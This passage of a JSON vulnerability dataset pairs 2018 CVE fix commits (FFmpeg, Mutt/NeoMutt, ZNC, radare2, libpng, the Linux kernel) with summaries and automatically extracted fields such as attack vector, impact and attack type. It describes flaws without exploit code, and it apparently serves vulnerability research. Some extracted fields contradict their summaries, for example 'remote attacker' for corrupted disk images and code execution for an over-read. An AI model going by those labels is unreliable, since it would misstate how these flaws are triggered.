0\nFixes: fpe_movenc.c_1108_1.ogg\nFixes: fpe_movenc.c_1108_2.ogg\nFixes: fpe_movenc.c_1108_3.wav\n\nFound-by: #CHEN HONGXU# <HCHEN017@e.ntu.edu.sg>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavformat\/movenc.c in FFmpeg before 4.0.2 allows attackers to cause a denial of service (application crash caused by a divide-by-zero error) with a user crafted audio file when converting to the MOV audio format.","commit_message_1":"write version <number> of audio atom if channel is not known the version <number> need the channel count and would divide by <number>","Vulnerability Type":"Divide By Zero","Attack Vector":"By persuading a victim to open a specially-crafted audio file","Impact":"cause a denial of service ( application crash caused by a divide - by - zero error ) with a user crafted audio file when converting to the mov audio format","Root Cause":"caused by a divide-by-zero","Attack Type":"remote attacker"},{"commit_id":"3a2d21bc5f97aa0161db3ae731fc2732be6108b8","cve_id":"CVE-2018-14394","cwe_id":"CWE-369","commit_message":"avformat\/movenc: Check input sample count\n\nFixes: division by 0\nFixes: fpe_movenc.c_199_1.wav\nFixes: fpe_movenc.c_199_2.wav\nFixes: fpe_movenc.c_199_3.wav\nFixes: fpe_movenc.c_199_4.wav\nFixes: fpe_movenc.c_199_5.wav\nFixes: fpe_movenc.c_199_6.wav\nFixes: fpe_movenc.c_199_7.wav\n\nFound-by: #CHEN HONGXU# <HCHEN017@e.ntu.edu.sg>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavformat\/movenc.c in FFmpeg before 4.0.2 allows attackers to cause a denial of service (application crash caused by a divide-by-zero error) with a user crafted Waveform audio file.","commit_message_1":"avformat\/movenc : check input sample count","Vulnerability Type":"Divide By Zero","Attack Vector":"By persuading a victim to open a specially-crafted Waveform audio file","Impact":"cause a denial of service ( application crash caused by a divide - by - zero error ) with a user crafted waveform audio file .","Root Cause":"caused by a divide-by-zero flaw","Attack Type":"remote attacker"},{"commit_id":"9bfab35522301794483f8f9ed60820bdec9be59e","cve_id":"CVE-2018-14363","cwe_id":"CWE-22","commit_message":"sanitise cache paths\n\nCo-authored-by: JerikoOne <jeriko.one@gmx.us>","summary":"An issue was discovered in NeoMutt before 2018-07-16. newsrc.c does not properly restrict '\/' characters that may have unsafe interaction with cache pathnames.","commit_message_1":"sanitise cache path","Vulnerability Type":"Path Traversal","Attack Vector":"none","Impact":"none","Root Cause":"does not properly restrict ' \/ ' characters that may","Attack Type":"attacker"},{"commit_id":"9e927affe3a021175f354af5fa01d22657c20585","cve_id":"CVE-2018-14361","cwe_id":"CWE-20","commit_message":"Add alloc fail check in nntp_fetch_headers","summary":"An issue was discovered in NeoMutt before 2018-07-16. nntp.c proceeds even if memory allocation fails for messages data.","commit_message_1":"add alloc fail check in nntp_fetch_headers","Vulnerability Type":"Improper Input Validation","Attack Vector":"has an unknown attack vector","Impact":"has an unknown impact","Root Cause":"if memory allocation fails for messages data","Attack Type":"local attacker"},{"commit_id":"6296f7153f0c9d5e5cd3aaf08f9731e56621bdd3","cve_id":"CVE-2018-14360","cwe_id":"CWE-119","commit_message":"Set length modifiers for group and desc\n\nnntp_add_group parses a line controlled by the connected nntp server.\nRestrict the maximum lengths read into the stack buffers group, and\ndesc.","summary":"An issue was discovered in NeoMutt before 2018-07-16. nntp_add_group in newsrc.c has a stack-based buffer overflow because of incorrect sscanf usage.","commit_message_1":"set length modifier for group and desc nntp_add_group par a line controlled by the connected nntp server","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted data","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the nntp_add_group function","Attack Type":"remote attacker"},{"commit_id":"6f163e07ae68654d7ac5268cbb7565f6df79ad85","cve_id":"CVE-2018-14359","cwe_id":"CWE-119","commit_message":"Check outbuf length in mutt_to_base64()\n\nThe obuf can be overflowed in auth_cram.c, and possibly auth_gss.c.\n\nThanks to Jeriko One for the bug report.","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They have a buffer overflow via base64 data.","commit_message_1":"check outbuf length in mutt_to_base64 ( ) the obuf can be overflowed in <file> , and possibly <file>","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long base64 data","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking","Attack Type":"remote attacker"},{"commit_id":"1b0f0d0988e6df4e32e9f4bf8780846ea95d4485","cve_id":"CVE-2018-14358","cwe_id":"CWE-119","commit_message":"Don't overflow stack buffer in msg_parse_fetch","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap\/message.c has a stack-based buffer overflow for a FETCH response with a long RFC822.SIZE field.","commit_message_1":"do n't overflow stack buffer in msg_parse_fetch","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long RFC822.SIZE","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"e52393740334443ae0206cab2d7caef381646725","cve_id":"CVE-2018-14357","cwe_id":"CWE-77","commit_message":"quote imap strings more carefully\n\nCo-authored-by: JerikoOne <jeriko.one@gmx.us>","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They allow remote IMAP servers to execute arbitrary commands via backquote characters, related to the mailboxes command associated with an automatic subscription.","commit_message_1":"quote imap string more carefully","Vulnerability Type":"Command Injection","Attack Vector":"via backquote characters , related to the mailboxes command associated with an automatic subscription","Impact":"execute arbitrary commands","Root Cause":"caused by improper handling of backquote characters","Attack Type":"remote attacker"},{"commit_id":"93b8ac558752d09e1c56d4f1bc82631316fa9c82","cve_id":"CVE-2018-14356","cwe_id":"CWE-824","commit_message":"Ensure UID in fetch_uidl","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. pop.c mishandles a zero-length UID.","commit_message_1":"ensure uid in fetch_uidl","Vulnerability Type":"Access of Uninitialized Pointer","Attack Vector":"An unspecified error with mishandling of a zero-length UID in pop.c in Mutt and NeoMutt","Impact":"none","Root Cause":"An unspecified error with mishandling of a zero-length UID","Attack Type":"attacker"},{"commit_id":"57971dba06346b2d7179294f4528b8d4427a7c5d","cve_id":"CVE-2018-14355","cwe_id":"CWE-22","commit_message":"Selectively cache headers\n\nCo-authored-by: JerikoOne <jeriko.one@gmx.us>","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap\/util.c mishandles *..* directory traversal in a mailbox name.","commit_message_1":"selectively cache header","Vulnerability Type":"Path Traversal","Attack Vector":"send a specially-crafted URL request containing \"dot dot\" sequences (\/..\/)","Impact":"view arbitrary files","Root Cause":"caused by improper input validation by the mailbox name","Attack Type":"remote attacker"},{"commit_id":"95e80bf9ff10f68cb6443f760b85df4117cb15eb","cve_id":"CVE-2018-14354","cwe_id":"CWE-77","commit_message":"Quote path in imap_subscribe","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They allow remote IMAP servers to execute arbitrary commands via backquote characters, related to the mailboxes command associated with a manual subscription or unsubscription.","commit_message_1":"quote path in imap_subscribe","Vulnerability Type":"Command Injection","Attack Vector":"via backquote characters , related to the mailboxes command associated with a manual subscription or unsubscription","Impact":"execute arbitrary commands","Root Cause":"caused by improper handling of backquote characters","Attack Type":"remote attacker"},{"commit_id":"65d64a5b60a4a3883f2cd799d92c6091d8854f23","cve_id":"CVE-2018-14353","cwe_id":"CWE-191","commit_message":"Check for int underflow in imap_quote_string","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap_quote_string in imap\/util.c has an integer underflow.","commit_message_1":"check for int underflow in imap_quote_string","Vulnerability Type":"integer underflow","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary code","Root Cause":"caused by an integer underflow","Attack Type":"remote attacker"},{"commit_id":"e27b65b3bf8defa34db58919496056caf3850cd4","cve_id":"CVE-2018-14352","cwe_id":"CWE-119","commit_message":"imap_quote_string make room for quotes","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap_quote_string in imap\/util.c does not leave room for quote characters, leading to a stack-based buffer overflow.","commit_message_1":"imap_quote_string make room for quote","Vulnerability Type":"buffer overflow","Attack Vector":"By sending overly long quote characters","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"3c49c44be9b459d9c616bcaef6eb5d51298c1741","cve_id":"CVE-2018-14351","cwe_id":"CWE-20","commit_message":"Ensure litlen isn't larger than our mailbox","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap\/command.c mishandles a long IMAP status mailbox literal count size.","commit_message_1":"ensure litlen is n't larger than our mailbox","Vulnerability Type":"Improper Input Validation","Attack Vector":"has an unknown attack vector","Impact":"has an unknown impact","Root Cause":"mishandling of a long IMAP status mailbox literal count size","Attack Type":"local attacker"},{"commit_id":"36a29280448097f34ce9c94606195f2ac643fed1","cve_id":"CVE-2018-14349","cwe_id":"CWE-20","commit_message":"Handle NO response without message properly","summary":"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap\/command.c mishandles a NO response without a message.","commit_message_1":"handle no response without message properly","Vulnerability Type":"Improper Input Validation","Attack Vector":"has an unknown attack vector","Impact":"has an unknown impact","Root Cause":"mishandling of a NO response without a message ","Attack Type":"local attacker"},{"commit_id":"147cec383892d143b5e02daa70f1e7def50f5d98","cve_id":"CVE-2018-14345","cwe_id":"CWE-287","commit_message":"Fix authentication when reusing an existing session\n\n- Check the success value before unlocking the session\n- Don't attempt to use the nonexistant \"sddm-check\" PAM service","summary":"An issue was discovered in SDDM through 0.17.0. If configured with ReuseSession=true, the password is not checked for users with an already existing session. Any user with access to the system D-Bus can therefore unlock any graphical session. This is related to daemon\/Display.cpp and helper\/backend\/PamBackend.cpp.","commit_message_1":"fix authentication when reusing an existing session","Vulnerability Type":"Improper Authentication","Attack Vector":"access to the system D-Bus","Impact":"bypass access restrictions and unlock any graphical session","Root Cause":"caused by the failure to check passwords for users with an already existing session","Attack Type":"attacker"},{"commit_id":"a4a5aeeb17d32937d8c7d743dae9a4cc755ce773","cve_id":"CVE-2018-14056","cwe_id":"CWE-22","commit_message":"Don't let web skin name ..\/..\/..\/..\/ access files outside of usual skins directories.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.","summary":"ZNC before 1.7.1-rc1 is prone to a path traversal flaw via ..\/ in a web skin name to access files outside of the intended skins directories.","commit_message_1":"do n't let web skin name","Vulnerability Type":"Path Traversal","Attack Vector":"send a specially-crafted URL request to the src\/WebModules.cpp script containing \"dot dot\" sequences (\/..\/) in a web skin name","Impact":"access arbitrary files","Root Cause":"is prone to a path traversal flaw","Attack Type":"remote attacker"},{"commit_id":"d22fef8620cdd87490754f607e7153979731c69d","cve_id":"CVE-2018-14055","cwe_id":"CWE-20","commit_message":"Better cleanup lines coming from network.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.","summary":"ZNC before 1.7.1-rc1 does not properly validate untrusted lines coming from the network, allowing a non-admin user to escalate his privilege and inject rogue values into znc.conf.","commit_message_1":"better cleanup line coming from network","Vulnerability Type":"Improper Input Validation","Attack Vector":"has an unknown attack vector","Impact":"escalate his privilege and inject rogue values into znc . conf","Root Cause":"does not properly validate untrusted lines coming from the network","Attack Type":"remote attacker"},{"commit_id":"db124b8f607dd0a40a9aef2d4d468fad433522a7","cve_id":"CVE-2018-14043","cwe_id":"CWE-732","commit_message":"fs: Don't try to delete the file when copying. It could cause a security issue if the file exists and doesn't allow other's to read\/write. delete could allow someone to create the file and have access to the data.","summary":"mstdlib (aka the M Standard Library for C) 1.2.0 has incorrect file access control in situations where M_fs_perms_can_access attempts to delete an existing file (that lacks public read\/write access) during a copy operation, related to fs\/m_fs.c and fs\/m_fs_path.c. An attacker could create the file and then would have access to the data.","commit_message_1":"do n't try to delete the file when copying","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"has incorrect file access control","Attack Type":"remote attacker"},{"commit_id":"eb0fb72b3c5307ec8e33effb6bf947e38cfdffe8","cve_id":"CVE-2018-14017","cwe_id":"CWE-125","commit_message":"Fix #10498 - Crash in fuzzed java file","summary":"The r_bin_java_annotation_new function in shlr\/java\/class.c in radare2 2.7.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted .class file because of missing input validation in r_bin_java_line_number_table_attr_new.","commit_message_1":"fix # <number> - crash in fuzzed java file","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted . class file because of missing input validation in r _ bin _ java _ line _ number _ table _ attr _ new","Impact":"cause a denial of service ( heap - based buffer over - read and application crash )","Root Cause":"caused by heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"40b021ba29c8f90ccf7c879fde2580bc73a17e8e","cve_id":"CVE-2018-14016","cwe_id":"CWE-125","commit_message":"Fix #10464 - oobread crash in mdmp","summary":"The r_bin_mdmp_init_directory_entry function in mdmp.c in radare2 2.7.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted Mini Crash Dump file.","commit_message_1":"fix # <number> - oobread crash in mdmp","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted mini crash dump file","Impact":"cause a denial of service ( heap - based buffer over - read and application crash )","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"bd1bab05083d80464fea854bf4b5c49aaf1b8401","cve_id":"CVE-2018-14015","cwe_id":"CWE-119","commit_message":"Fix #10465 - Avoid string on low addresses (workaround) for corrupted dwarf","summary":"The sdb_set_internal function in sdb.c in radare2 2.7.0 allows remote attackers to cause a denial of service (invalid read and application crash) via a crafted ELF file because of missing input validation in r_bin_dwarf_parse_comp_unit in libr\/bin\/dwarf.c.","commit_message_1":"fix # <number> - avoid string on low address ( workaround ) for corrupted dwarf","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted elf file because of missing input validation in r _ bin _ dwarf _ parse _ comp _ unit in libr \/ bin \/ dwarf . c","Impact":"cause a denial of service ( invalid read and application crash )","Root Cause":"caused by an invalid input validation","Attack Type":"remote attacker"},{"commit_id":"8a05766cb74af05c04c53e6c9d60c13fc4d59bf2","cve_id":"CVE-2018-13785","cwe_id":"CWE-190","commit_message":"[libpng16] Fix the calculation of row_factor in png_check_chunk_length\n\n(Bug report by Thuan Pham, SourceForge issue #278)","summary":"In libpng 1.6.34, a wrong calculation of row_factor in the png_check_chunk_length function (pngrutil.c) may trigger an integer overflow and resultant divide-by-zero while processing a crafted PNG file, leading to a denial of service.","commit_message_1":"fix the calculation of row_factor in png_check_chunk_length","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a wrong calculation of row_factor","Attack Type":"remote attacker"},{"commit_id":"9f645bcc566a1e9f921bdae7528a01ced5bc3713","cve_id":"CVE-2018-13406","cwe_id":"CWE-190","commit_message":"video: uvesafb: Fix integer overflow in allocation\n\ncmap->len can get close to INT_MAX\/2, allowing for an integer overflow in\nallocation. This uses kmalloc_array() instead to catch the condition.\n\nReported-by: Dr Silvio Cesare of InfoSect <silvio.cesare@gmail.com>\nFixes: 8bdb3a2d7df48 (\"uvesafb: the driver core\")\nCc: stable@vger.kernel.org\nSigned-off-by: Kees Cook <keescook@chromium.org>","summary":"An integer overflow in the uvesafb_setcmap function in drivers\/video\/fbdev\/uvesafb.c in the Linux kernel before 4.17.4 could result in local attackers being able to crash the kernel or potentially elevate privileges because kmalloc_array is not used.","commit_message_1":"uvesafb : fix integer overflow in allocation cmap- > len can get close to int_max\/<number> , allowing for an integer overflow in allocation","Vulnerability Type":"integer overflow","Attack Vector":"kmalloc_array is not used","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"0fa3ecd87848c9c93c2c828ef4c3a8ca36ce46c7","cve_id":"CVE-2018-13405","cwe_id":"CWE-269","commit_message":"Fix up non-directory creation in SGID directories\n\nsgid directories have special semantics, making newly created files in\nthe directory belong to the group of the directory, and newly created\nsubdirectories will also become sgid.  This is historically used for\ngroup-shared directories.\n\nBut group directories writable by non-group members should not imply\nthat such non-group members can magically join the group, so make sure\nto clear the sgid bit on non-directories for non-members (but remember\nthat sgid without group execute means \"mandatory locking\", just to\nconfuse things even more).\n\nReported-by: Jann Horn <jannh@google.com>\nCc: Andy Lutomirski <luto@kernel.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The inode_init_owner function in fs\/inode.c in the Linux kernel through 4.17.4 allows local users to create files with an unintended group ownership, in a scenario where a directory is SGID to a certain group and is writable by a user who is not a member of that group. Here, the non-member can trigger creation of a plain file whose group ownership is that group. The intended behavior was that the non-member can trigger creation of a directory (but not a plain file) whose group ownership is that group. The non-member can escalate privileges by making the plain file executable and SGID.","commit_message_1":"fix up non-directory creation in sgid directory sgid directory have special semantics , making newly created file in the directory belong to the group of the directory , and newly created subdirectory will also become sgid","Vulnerability Type":"Improper Privilege Management","Attack Vector":"by making the plain file executable and SGID","Impact":"create files with an unintended group ownership , in a scenario where a directory is sgid to a certain group and is writable by a user who is not a member of that group .","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"bd27a9364ca274ca97f1df6d984e88a0700fb235","cve_id":"CVE-2018-13304","cwe_id":"CWE-617","commit_message":"avcodec\/mpeg4videodec: Remove use of FF_PROFILE_MPEG4_SIMPLE_STUDIO as indicator of studio profile\n\nThe profile field is changed by code inside and outside the decoder,\nits not a reliable indicator of the internal codec state.\nMaintaining it consistency with studio_profile is messy.\nIts easier to just avoid it and use only studio_profile\n\nFixes: assertion failure\nFixes: ffmpeg_crash_9.avi\n\nFound-by: Thuan Pham, Marcel B\u00f6hme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavcodec in FFmpeg 4.0.1, improper maintenance of the consistency between the context profile field and studio_profile in libavcodec may trigger an assertion failure while converting a crafted AVI file to MPEG4, leading to a denial of service, related to error_resilience.c, h263dec.c, and mpeg4videodec.c.","commit_message_1":"remove use of ff_profile_mpeg4_simple_studio a indicator of studio profile the profile field is changed by code inside and outside the decoder , it not a reliable indicator of the internal codec state","Vulnerability Type":"Reachable Assertion","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"00e8181bd97c834fe60751b0c511d4bb97875f78","cve_id":"CVE-2018-13303","cwe_id":"CWE-476","commit_message":"avcodec\/ac3_parser: Check init_get_bits8() for failure\n\nFixes: null pointer dereference\nFixes: ffmpeg_crash_6.avi\n\nFound-by: Thuan Pham, Marcel B\u00f6hme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart\nReviewed-by: Paul B Mahol <onemda@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 4.0.1, a missing check for failure of a call to init_get_bits8() in the avpriv_ac3_parse_header function in libavcodec\/ac3_parser.c may trigger a NULL pointer dereference while converting a crafted AVI file to MPEG4, leading to a denial of service.","commit_message_1":"avcodec\/ac3_parser : check init_get_bits8 ( ) for failure","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"ed22dc22216f74c75ee7901f82649e1ff725ba50","cve_id":"CVE-2018-13302","cwe_id":"CWE-129","commit_message":"avformat\/movenc: Check that frame_types other than EAC3_FRAME_TYPE_INDEPENDENT have a supported substream id\n\nFixes: out of array access\nFixes: ffmpeg_bof_1.avi\n\nFound-by: Thuan Pham, Marcel B\u00f6hme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 4.0.1, improper handling of frame types (other than EAC3_FRAME_TYPE_INDEPENDENT) that have multiple independent substreams in the handle_eac3 function in libavformat\/movenc.c may trigger an out-of-array access while converting a crafted AVI file to MPEG4, leading to a denial of service or possibly unspecified other impact.","commit_message_1":"check that frame_types other than eac3_frame_type_independent have a supported substream id","Vulnerability Type":"Improper Validation of Array Index","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"remote attacker"},{"commit_id":"2aa9047486dbff12d9e040f917e5f799ed2fd78b","cve_id":"CVE-2018-13301","cwe_id":"CWE-476","commit_message":"avcodec\/mpeg4videodec: Check read profile before setting it\n\nFixes: null pointer dereference\nFixes: ffmpeg_crash_7.avi\n\nFound-by: Thuan Pham, Marcel B\u00f6hme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 4.0.1, due to a missing check of a profile value before setting it, the ff_mpeg4_decode_picture_header function in libavcodec\/mpeg4videodec.c may trigger a NULL pointer dereference while converting a crafted AVI file to MPEG4, leading to a denial of service.","commit_message_1":"avcodec\/mpeg4videodec : check read profile before setting it","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference flaw","Attack Type":"remote attacker"},{"commit_id":"95556e27e2c1d56d9e18f5db34d6f756f3011148","cve_id":"CVE-2018-13300","cwe_id":"CWE-125","commit_message":"avformat\/movenc: Do not pass AVCodecParameters in avpriv_request_sample\n\nFixes: out of array read\nFixes: ffmpeg_crash_8.avi\n\nFound-by: Thuan Pham, Marcel B\u00f6hme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 4.0.1, an improper argument (AVCodecParameters) passed to the avpriv_request_sample function in the handle_eac3 function in libavformat\/movenc.c may trigger an out-of-array read while converting a crafted AVI file to MPEG4, leading to a denial of service and possibly an information disclosure.","commit_message_1":"avformat\/movenc : do not pas avcodecparameters in avpriv_request_sample","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-array read","Attack Type":"remote attacker"},{"commit_id":"23fcb3340d033d9f081e21e6c12c2db7eaa541d3","cve_id":"CVE-2018-13095","cwe_id":"CWE-476","commit_message":"xfs: More robust inode extent count validation\n\nWhen the inode is in extent format, it can't have more extents that\nfit in the inode fork. We don't currenty check this, and so this\ncorruption goes unnoticed by the inode verifiers. This can lead to\ncrashes operating on invalid in-memory structures.\n\nAttempts to access such a inode will now error out in the verifier\nrather than allowing modification operations to proceed.\n\nReported-by: Wen Xu <wen.xu@gatech.edu>\nSigned-off-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Darrick J. Wong <darrick.wong@oracle.com>\n[darrick: fix a typedef, add some braces and breaks to shut up compiler warnings]\nSigned-off-by: Darrick J. Wong <darrick.wong@oracle.com>","summary":"An issue was discovered in fs\/xfs\/libxfs\/xfs_inode_buf.c in the Linux kernel through 4.17.3. A denial of service (memory corruption and BUG) can occur for a corrupted xfs image upon encountering an inode that is in extent format, but has more extents than fit in the inode fork.","commit_message_1":"more robust inode extent count validation when the inode is in extent format , it ca n't have more extent that fit in the inode fork","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory corruption","Attack Type":"remote attacker"},{"commit_id":"bb3d48dcf86a97dc25fe9fc2c11938e19cb4399a","cve_id":"CVE-2018-13094","cwe_id":"CWE-476","commit_message":"xfs: don't call xfs_da_shrink_inode with NULL bp\n\nxfs_attr3_leaf_create may have errored out before instantiating a buffer,\nfor example if the blkno is out of range.  In that case there is no work\nto do to remove it, and in fact xfs_da_shrink_inode will lead to an oops\nif we try.\n\nThis also seems to fix a flaw where the original error from\nxfs_attr3_leaf_create gets overwritten in the cleanup case, and it\nremoves a pointless assignment to bp which isn't used after this.\n\nBugzilla: https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=199969\nReported-by: Xu, Wen <wen.xu@gatech.edu>\nTested-by: Xu, Wen <wen.xu@gatech.edu>\nSigned-off-by: Eric Sandeen <sandeen@redhat.com>\nReviewed-by: Darrick J. Wong <darrick.wong@oracle.com>\nSigned-off-by: Darrick J. Wong <darrick.wong@oracle.com>","summary":"An issue was discovered in fs\/xfs\/libxfs\/xfs_attr_leaf.c in the Linux kernel through 4.17.3. An OOPS may occur for a corrupted xfs image after xfs_da_shrink_inode() is called with a NULL bp.","commit_message_1":"do n't call xfs_da_shrink_inode with null bp xfs_attr3_leaf_create may have errored out before instantiating a buffer , for example if the blkno is out of range","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"afca6c5b2595fc44383919fba740c194b0b76aff","cve_id":"CVE-2018-13093","cwe_id":"CWE-476","commit_message":"xfs: validate cached inodes are free when allocated\n\nA recent fuzzed filesystem image cached random dcache corruption\nwhen the reproducer was run. This often showed up as panics in\nlookup_slow() on a null inode->i_ops pointer when doing pathwalks.\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000000\n....\nCall Trace:\n lookup_slow+0x44\/0x60\n walk_component+0x3dd\/0x9f0\n link_path_walk+0x4a7\/0x830\n path_lookupat+0xc1\/0x470\n filename_lookup+0x129\/0x270\n user_path_at_empty+0x36\/0x40\n path_listxattr+0x98\/0x110\n SyS_listxattr+0x13\/0x20\n do_syscall_64+0xf5\/0x280\n entry_SYSCALL_64_after_hwframe+0x42\/0xb7\n\nbut had many different failure modes including deadlocks trying to\nlock the inode that was just allocated or KASAN reports of\nuse-after-free violations.\n\nThe cause of the problem was a corrupt INOBT on a v4 fs where the\nroot inode was marked as free in the inobt record. Hence when we\nallocated an inode, it chose the root inode to allocate, found it in\nthe cache and re-initialised it.\n\nWe recently fixed a similar inode allocation issue caused by inobt\nrecord corruption problem in xfs_iget_cache_miss() in commit\nee457001ed6c (\"xfs: catch inode allocation state mismatch\ncorruption\"). This change adds similar checks to the cache-hit path\nto catch it, and turns the reproducer into a corruption shutdown\nsituation.\n\nReported-by: Wen Xu <wen.xu@gatech.edu>\nSigned-Off-By: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nReviewed-by: Carlos Maiolino <cmaiolino@redhat.com>\nReviewed-by: Darrick J. Wong <darrick.wong@oracle.com>\n[darrick: fix typos in comment]\nSigned-off-by: Darrick J. Wong <darrick.wong@oracle.com>","summary":"An issue was discovered in fs\/xfs\/xfs_icache.c in the Linux kernel through 4.17.3. There is a NULL pointer dereference and panic in lookup_slow() on a NULL inode->i_ops pointer when doing pathwalks on a corrupted xfs image. This occurs because of a lack of proper validation that cached inodes are free during allocation.","commit_message_1":"validate cached inodes are free when allocated a recent fuzzed filesystem image cached random dcache corruption when the reproducer wa run","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference and panic","Attack Type":"remote attacker"},{"commit_id":"bceb03fd2be95097a7b409ea59914f332fb6bc86","cve_id":"CVE-2018-13006","cwe_id":"CWE-125","commit_message":"fixed 2 possible heap overflows (inc. #1088)","summary":"An issue was discovered in MP4Box in GPAC 0.7.1. There is a heap-based buffer over-read in the isomedia\/box_dump.c function hdlr_dump.","commit_message_1":"fixed <number> possible heap overflow ( inc","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"a heap-based buffer over-read in the isomedia\/box_dump.c function hdlr_dump","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by hdlr_dump function","Attack Type":"remote attacker"},{"commit_id":"727ba748e110b4de50d142edca9d6a9b7e6111d8","cve_id":"CVE-2018-12904","cwe_id":null,"commit_message":"kvm: nVMX: Enforce cpl=0 for VMX instructions\n\nVMX instructions executed inside a L1 VM will always trigger a VM exit\neven when executed with cpl 3. This means we must perform the\nprivilege check in software.\n\nFixes: 70f3aac964ae(\"kvm: nVMX: Remove superfluous VMX instruction fault checks\")\nCc: stable@vger.kernel.org\nSigned-off-by: Felix Wilhelm <fwilhelm@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"In arch\/x86\/kvm\/vmx.c in the Linux kernel before 4.17.2, when nested virtualization is used, local attackers could cause L1 KVM guests to VMEXIT, potentially allowing privilege escalations and denial of service attacks due to lack of checking of CPL.","commit_message_1":"nvmx : enforce cpl=<number> for vmx instruction vmx instruction executed inside a l1 vm will always trigger a vm exit even when executed with cpl <number>","Vulnerability Type":"unspecified","Attack Vector":"If nested virtualization is used","Impact":"gain elevated privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"78c9c4dfbf8c04883941445a195276bb4bb92c76","cve_id":"CVE-2018-12896","cwe_id":"CWE-190","commit_message":"posix-timers: Sanitize overrun handling\n\nThe posix timer overrun handling is broken because the forwarding functions\ncan return a huge number of overruns which does not fit in an int. As a\nconsequence timer_getoverrun(2) and siginfo::si_overrun can turn into\nrandom number generators.\n\nThe k_clock::timer_forward() callbacks return a 64 bit value now. Make\nk_itimer::ti_overrun[_last] 64bit as well, so the kernel internal\naccounting is correct. 3Remove the temporary (int) casts.\n\nAdd a helper function which clamps the overrun value returned to user space\nvia timer_getoverrun(2) or siginfo::si_overrun limited to a positive value\nbetween 0 and 